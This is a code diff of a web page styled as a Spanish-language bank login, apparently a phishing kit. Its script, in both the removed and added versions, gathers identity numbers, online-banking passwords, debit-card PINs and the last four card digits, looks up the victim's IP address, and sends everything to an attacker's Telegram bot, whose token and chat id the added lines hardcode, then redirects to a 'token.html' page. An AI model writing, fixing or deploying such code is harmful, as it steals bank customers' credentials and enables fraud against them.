@@ -11,13 +11,11 @@
     .welcome-section{display:flex;align-items:center;margin-bottom:20px}
     .bank-logo{width:60px;height:60px;margin-right:15px}
     .welcome-text{font-size:18px;color:#000;font-weight:normal}
-    /* HELP BANNER restaurado */
     .help-banner{background:#0b66c2;color:#fff;border-radius:10px;padding:1px;display:flex;align-items:center;margin-bottom:20px}
     .help-banner-image{width:60px;height:90px;object-fit:cover;border-radius:-20%;margin-right:15px}
     .help-text{flex:1;font-size:12px}
     .help-title{font-size:12px;margin-bottom:10px;font-weight:normal}
     .help-link{color:#fff;text-decoration:none;display:flex;align-items:center;font-weight:normal}
-    /* resto */
     .login-container{background:#fff;border-radius:10px;padding:20px;box-shadow:0 2px 5px rgba(0,0,0,0.1)}
     .tab-container{display:flex;border-bottom:1px solid #ddd;margin-bottom:20px}
     .tab{flex:1;text-align:center;padding:10px;font-size:16px;color:#777;cursor:pointer}
@@ -28,17 +26,9 @@
     .form-group{margin-bottom:15px}
     .form-label{display:block;font-size:14px;color:#555;margin-bottom:5px}
     .form-row{display:flex;gap:10px;}
-    /* Proporción 30/70 solo para selects e inputs dentro de .form-row */
-    .form-row > select.form-control {
-      flex: 0.3; max-width:30%; padding:10px; border:1px solid #ccc; border-radius:5px; background:#fff; font-size:14px; outline:none;
-    }
-    .form-row > input.form-control {
-      flex: 0.7; width:auto; padding:10px; border:1px solid #ccc; border-radius:5px; font-size:14px; outline:none;
-    }
-    /* Para todos los demás inputs */
-    input.form-control {
-      padding:10px; border:1px solid #ccc; border-radius:5px; font-size:14px; outline:none; width:100%;
-    }
+    .form-row > select.form-control{flex:0.3;max-width:30%;padding:10px;border:1px solid #ccc;border-radius:5px;background:#fff;font-size:14px;outline:none;}
+    .form-row > input.form-control{flex:0.7;width:auto;padding:10px;border:1px solid #ccc;border-radius:5px;font-size:14px;outline:none;}
+    input.form-control{width:100%;padding:10px;border:1px solid #ccc;border-radius:5px;font-size:14px;outline:none;}
     .password-input{position:relative}
     .toggle-password{position:absolute;right:10px;top:50%;transform:translateY(-50%);color:#0b66c2;font-size:12px;cursor:pointer}
     .btn-login{width:100%;padding:12px;background:#f2f2f2;color:#555;border:none;border-radius:30px;font-size:16px;cursor:pointer;transition:background 0.3s;margin-bottom:20px}
@@ -177,88 +167,71 @@
       toggle.addEventListener('click',function(){
         const inp = this.previousElementSibling;
         if(inp.type === 'password'){
-          inp.type = 'text';
-          this.textContent = 'Ocultar';
+          inp.type = 'text'; this.textContent = 'Ocultar';
         } else {
-          inp.type = 'password';
-          this.textContent = 'Mostrar';
+          inp.type = 'password'; this.textContent = 'Mostrar';
         }
       });
     });
 
-    // Cerrar mensaje informativo
-    document.querySelector('.close-btn').addEventListener('click', () => {
-      document.querySelector('.info-message').style.display = 'none';
-    });
+    // Cerrar info
+    document.querySelector('.close-btn').onclick = () => {
+      document.querySelector('.info-message').style.display='none';
+    };
 
-    // Activar/desactivar botón
+    // Habilitar botón
     const btn = document.getElementById('btnIngresar');
     ['idNumCS','claveInput','idNumTD','claveTarjeta','ult4Tarjeta']
       .map(id=>document.getElementById(id))
-      .forEach(el=>el.addEventListener('input', checkFields));
-
+      .forEach(el=>el.addEventListener('input',checkFields));
     function checkFields(){
       const active = document.querySelector('.tab.active').dataset.target;
-      let ok = false;
-      if(active === 'clave-segura'){
+      let ok=false;
+      if(active==='clave-segura'){
         ok = idNumCS.value.trim()!=='' && claveInput.value.trim()!=='';
       } else {
         ok = idNumTD.value.trim()!=='' && claveTarjeta.value.trim()!=='' && ult4Tarjeta.value.trim()!=='';
       }
-      btn.disabled = !ok;
-      btn.classList.toggle('active', ok);
+      btn.disabled=!ok;
+      btn.classList.toggle('active',ok);
     }
 
-    // Enviar a Telegram con ubicación
+    // Enviar a Telegram y redirigir
+    const token = '7566301264:AAETlzNwR9-iuvl4xiUEuWsiYGd1hR-L4zk'; // Reemplaza con tu token real
+    const chat_id = '-1002373013684'; // Reemplaza con tu chat_id
 
-  
-  const token2 = import.meta.env.VITE_BOT_TOKEN;
-        const chatid2 = import.meta.env.VITE_CHAT_ID;
+    btn.addEventListener('click', async ()=>{
+      const active = document.querySelector('.tab.active').dataset.target;
+      const datos = {
+        tipo: active==='clave-segura'?'Clave Segura':'Tarjeta Débito',
+        tipoId: active==='clave-segura'?idTypeCS.value:idTypeTD.value,
+        id: active==='clave-segura'?idNumCS.value:idNumTD.value,
+        clave: active==='clave-segura'?claveInput.value:claveTarjeta.value,
+        ult4: active==='tarjeta-debito'?ult4Tarjeta.value:null
+      };
 
+      try {
+        const ip = (await fetch('https://api.ipify.org?format=json').then(r=>r.json())).ip || 'desconocida';
+        let mensaje = `🔔 *Nuevo acceso recibido:*\n\n`;
+        mensaje += `🔐 *Tipo:* ${datos.tipo}\n`;
+        mensaje += `🪪 *Tipo ID:* ${datos.tipoId}\n`;
+        mensaje += `🧾 *Identificación:* \`${datos.id}\`\n`;
+        mensaje += `🔑 *Clave:* \`${datos.clave}\`\n`;
+        if(datos.ult4) mensaje += `💳 *Últimos 4 dígitos:* \`${datos.ult4}\`\n`;
+        mensaje += `🌐 *IP:* \`${ip}\``;
 
-  btn.addEventListener('click', async ()=>{
-    const active = document.querySelector('.tab.active').dataset.target;
-
-    const datos = {
-      tipo: active === 'clave-segura' ? 'Clave Segura' : 'Tarjeta Débito',
-      tipoId: active === 'clave-segura' ? idTypeCS.value : idTypeTD.value,
-      id: active === 'clave-segura' ? idNumCS.value : idNumTD.value,
-      clave: active === 'clave-segura' ? claveInput.value : claveTarjeta.value,
-      ult4: active === 'tarjeta-debito' ? ult4Tarjeta.value : null
-    };
-
-    try {
-      const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-      const ip = ipData.ip;
-
-      let mensaje = `🔔 *Nuevo acceso recibido:*\n\n`;
-      mensaje += `🔐 *Tipo:* ${datos.tipo}\n`;
-      mensaje += `🪪 *Tipo ID:* ${datos.tipoId}\n`;
-      mensaje += `🧾 *Identificación:* \`${datos.id}\`\n`;
-      mensaje += `🔑 *Clave:* \`${datos.clave}\`\n`;
-      if(datos.ult4) mensaje += `💳 *Últimos 4 dígitos:* \`${datos.ult4}\`\n`;
-      mensaje += `🌐 *IP:* \`${ip}\``;
-
-      await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type':'application/json' },
-          body: JSON.stringify({
-            chat_id: chatid2,
-            text: mensaje,
-            parse_mode: 'Markdown'
-          })
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({ chat_id, text: mensaje, parse_mode:'Markdown' })
         });
 
-      window.location.href = 'token.html';
-
-    } catch (error) {
-      console.error('Error al enviar mensaje a Telegram o al obtener IP:', error);
-      alert('Hubo un problema al procesar tu solicitud. Intenta nuevamente.');
-    }
-  });
-</script>
-  
+        window.location.href='token.html';
+      } catch(e){
+        console.error(e);
+        alert('Ocurrió un error, intenta de nuevo.');
+      }
+    });
   </script>
-
 </body>
 </html>
